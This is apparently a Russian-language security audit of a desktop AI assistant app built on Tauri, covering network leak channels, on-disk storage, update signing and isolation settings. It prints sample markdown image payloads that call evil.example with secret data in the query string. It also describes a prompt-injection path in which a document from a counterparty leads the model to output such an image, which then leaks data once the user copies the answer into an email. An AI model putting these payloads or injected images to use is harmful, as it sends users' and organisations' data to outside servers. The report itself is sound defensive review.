Дата: 2026-08-05. Ревизия: `1d6e378`. Метод: три направления параллельно + адверсарная проверка карты трафика (опровергла две формулировки и нашла реальный канал, который оба исходных набора описали неверно). Ключевые утверждения перепроверены мной лично прогоном кода — помечено E2.

Верная формулировка узкее и приведена в договорном документе. → **F-SECURITY-004 (P1)**.

### 1.1 Канал утечки через контент: буфер обмена (E2, проверено лично)

Обе исходные версии этого сюжета оказались неточны, и правильная — хуже обеих.

Что я проверил прогоном настоящего модуля `markdown.ts`:

```
![x](https://evil.example/p.png?d=secret)  →  <p><img src="https://evil.example/p.png?d=secret" alt="x"></p>
<img src="https://evil.example/raw.png">   →  экранируется как текст (html:false)
![x](data:image/png;base64,AAAA)           →  <img alt="x">   (data: вырезается)
```

То есть санитайзер **явно разрешает** `https` на атрибуте `src` (`markdown.ts:131-136`: `URI_ATTRS` включает `src`, `SAFE_URI` пропускает `https?:`), а вырезает как раз безопасную схему `data:`.

**Внутри окна приложения загрузка блокируется CSP** (`img-src 'self' data: blob:`) — Tauri отдаёт заголовок на каждом ответе протокола, запрос не уходит даже до DNS. Здесь защита работает.

**Но кнопка «Копировать» кладёт в системный буфер тот же HTML целиком** (`ui.ts:106-133`: `new ClipboardItem({"text/html": ...})`). Пользователь вставляет ответ в Word, Outlook или письмо — **и картинку загружает уже они, где CSP приложения не действует**. Канал работает при выключенном тумблере, не пишется в журнал исходящих и не требует ни одной ошибки пользователя, кроме обычного «скопировать ответ».

Триггер уточнён (важно для договора): текст документа сам по себе `<img>` не создаёт — реплика пользователя рендерится через `textContent` (`ui.ts:233`), Markdown применяется только к **ответу модели** (`ui.ts:239`). Значит путь такой: в присланном контрагентом документе есть инструкция-инъекция → модель воспроизводит её как markdown-картинку → пользователь копирует ответ в письмо → чужой сервер получает IP организации, время и всё, что было в query-строке.

Существующий тест `markdown.test.ts:42` проверяет **сырой** `<img src=x onerror=...>` — то есть вектор, который и так экранируется, — и создаёт ложную уверенность, что картинки закрыты. Markdown-синтаксиса картинки нет ни в одном из 20 тестов. → **F-SECURITY-005 (P1)**.

## 2. Что пишется на диск

**Хорошая новость, которую проверяли отдельно: журнал приложения чист от клиентских данных.** Прочитаны все 17 вызовов `journal::info/warn/error` — фрагментов документов, текстов переписки, имён вложений и поисковых запросов в `jai.log` нет; `tools.rs` и `agent.rs` не пишут в журнал вовсе. Просьба «пришлите логи» безопасна по содержимому. Остаточное: в журнал попадают абсолютные пути (а значит, учётное имя пользователя — в малом бизнесе обычно ФИО), метки флешек и поминутная картина рабочего дня, включая моменты диктовки.

**Плохая новость: сами данные не защищены ничем.**

| Что | Где | Состояние |
|---|---|---|
| База документов `documents.db` + `-wal` | каталог данных | **не шифруется**; SQLite без `secure_delete`/`VACUUM` — **удалённый документ остаётся читаемым в файле** |
| Вся переписка `conversations/*.json` | каталог данных | не шифруется |
| `documents.db.corrupt.bak` | каталог данных | **вечная незашифрованная копия всей базы**, которую никто не удаляет |
| `settings.json` | каталог данных | **API-ключ поисковика открытым текстом** |
| tmp-файлы `write_atomic` | каталог данных | содержат полный диалог; не убираются (F-SECURITY-002) |
| Права доступа к каталогу | все ОС | **не ограничиваются никогда** — на Linux другой пользователь машины читает базу целиком |
| **Windows: расположение каталога** | `%APPDATA%` — **Roaming** | в домене или на терминальном сервере **вся база документов и переписки автоматически уезжает на файловый сервер организации** — при том что продукт продаётся под обещание «данные не покидают компьютер» |
| Деинсталляция | — | **не удаляет ничего**: после «удаления программы» на диске остаётся всё |

Roaming-профиль и отсутствие шифрования — два самых весомых пункта для договора: первый превращает локальное хранение в сетевое без ведома пользователя, второй означает, что кража ноутбука = выдача всей базы. → **F-SECURITY-006 (P0)**, **F-SECURITY-007 (P1)**.

## 3. Конфигурация и изоляция

**Сделано хорошо (не сломать при переделке):** CSP жёсткая и осмысленная — `default-src 'self'`, `script-src 'self'` без `unsafe-inline`/`eval` (инлайновый скрипт темы работает за счёт sha256-хешей, посчитанных на сборке), `object-src`/`base-uri`/`frame-src` закрыты; `devCsp` в релиз не попадает (проверено в исходниках Tauri); ни одной `dangerous*`-настройки; `withGlobalTauri: false`; сверх конфига — навигационный заслон (`lib.rs:151-159`), закрывающий top-level навигацию, которую CSP не закрывает. Вредоносный HTML из документа клиента через RAG **не выполняется**: прогон показал, что `<script>`, `<iframe>`, `<form>`, `<svg><image>`, `<object>` экранируются; KaTeX `\href`/`\includegraphics` дают ошибку; XXE невозможен (`quick_xml` не резолвит внешние сущности).

**Дефекты:**

- **Установка обновления с диска не проверяет подпись вообще** (`update.rs`) — а это **основной путь поставки** для офлайн-клиента (флешка). Онлайн-канал подпись проверяет (minisign), офлайн-канал — нет. Подменённый файл на флешке установится молча. → **F-SECURITY-008 (P0)**.
- `read_url` в агентном режиме отдаёт модели содержимое произвольного публичного URL — это канал не только ввода, но и вывода: модель может обратиться по адресу с данными в query-строке. Бюджеты (`MAX_TOOL_ROUNDS = 4`, `MAX_SEARCHES = 2`, `MAX_READS = 2`) ограничивают объём, но не сам факт.
- Журнал исходящих покрывает **один из четырёх** сетевых путей — только агентный (F-SECURITY-004).
- Онлайн-режим **нельзя выключить необратимо**: согласие даётся один раз на всё, обратного «запретить навсегда» нет.
- `capabilities` шире необходимого: `opener` разрешает `open_url` на весь `http(s)` — при XSS во фронте это канал наружу в обход всей сетевой изоляции.
- Установщики не подписаны (нет EV-сертификата) — клиента к предупреждениям SmartScreen никто не готовит.
- В CSP не задан `form-action` (сегодня недостижимо, так как `<form>` экранируется, — но защита держится на одном слое).

## Находки этапа

**P0:** F-SECURITY-006 (Windows Roaming: база уезжает на файловый сервер организации), F-SECURITY-008 (офлайн-обновление без проверки подписи).
**P1:** F-SECURITY-004 (три из четырёх сетевых путей мимо тумблера и мимо журнала), F-SECURITY-005 (внешние картинки через буфер обмена), F-SECURITY-007 (ничего не шифруется, права не ограничены, деинсталляция не чистит, удалённое остаётся в SQLite).
**P2:** F-SECURITY-009 (агентный режим: read_url как канал вывода, невозможность необратимо выключить, ключ открытым текстом, opener без скоупа).
